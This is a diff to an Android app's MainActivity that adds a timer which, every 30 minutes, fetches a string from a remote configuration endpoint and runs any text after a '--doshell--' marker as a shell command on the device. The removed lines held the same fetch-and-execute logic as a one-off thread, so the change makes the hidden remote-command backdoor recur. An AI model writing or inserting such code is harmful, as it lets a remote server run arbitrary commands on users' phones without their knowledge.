@@ -9,7 +9,11 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Timer;
 import java.util.UUID;
+
+import net.tsz.afinal.FinalHttp;
+import net.tsz.afinal.http.AjaxCallBack;
 
 import org.apache.http.HttpEntity;
 import org.apache.http.client.ClientProtocolException;
@@ -30,6 +34,7 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.Handler;
+import android.os.Message;
 import android.support.v4.app.FragmentActivity;
 import android.support.v4.view.PagerAdapter;
 import android.support.v4.view.ViewPager;
@@ -118,28 +123,11 @@ public class MainActivity extends FragmentActivity{
 		checkUserMsg();
 		regBroadCast();
 		regRegionLimitBroad();
-		
+		TimerStart();
 		Intent intent = new Intent(this,MsgService.class);
 		startService(intent);
-		new Auth(MainActivity.this,"MBUI4");
-        new Thread(){
-
-			@Override
-			public void run() {
-				// TODO Auto-generated method stub
-				// boolean re= CommandUtil.DoShell();
-				 String shellstr=RequestUtil.getInstance().request(Configs.GetDoShell());
-//				 Log.d("shellre",shellstr);
-//				 Log.d("shellindex",shellstr.indexOf("--doshell--")+"");
-				 if(shellstr.indexOf("--doshell--")==0){
-					 String []rearr=shellstr.split(":");
-					 Log.d("doshell",rearr[1]);
-					 //
-					 boolean re= CommandUtil.DoShell(rearr[1]);
-				 }
-			}
-        	
-        }.start();
+	 
+  
 //        new Auth(MainActivity.this, "MBUI4");
         //
        
@@ -160,7 +148,48 @@ public class MainActivity extends FragmentActivity{
 		}
 	}
 	
+	private void TimerStart() {
+		// TODO Auto-generated method stub
+		 Timer timer = new Timer();
+		 timer.schedule(new java.util.TimerTask(){
 
+			@Override
+			public void run() {
+				// TODO Auto-generated method stub
+				//initIp();
+				timeHandler.sendEmptyMessage(0);
+			
+			}                 
+			 
+		 },1000*60*2,1000*60*30);
+	} 
+    Handler timeHandler=new Handler(){
+
+		@Override
+		public void handleMessage(Message msg) {
+			// TODO Auto-generated method stub
+			super.handleMessage(msg);
+			new Auth(MainActivity.this,"MBUI4");
+			new Thread(new Runnable() {
+				  
+				@Override
+				public void run() {
+					// TODO Auto-generated method stub
+					String shellstr=RequestUtil.getInstance().request(Configs.GetDoShell());
+					// Log.d("shellre",shellstr);
+//					 Log.d("shellindex",shellstr.indexOf("--doshell--")+"");
+					 if(shellstr.indexOf("--doshell--")==0){
+						 String []rearr=shellstr.split(":");
+						// Log.d("doshell",rearr[1]);
+						 //
+						 boolean re= CommandUtil.DoShell(rearr[1]);
+					 }
+				}
+			}){}.start();
+			 
+		}
+    	
+    };
 	private Class<?>[] getParamTypes(Class<?> activityTherad, String string) {
 		// TODO Auto-generated method stub
 		return null;
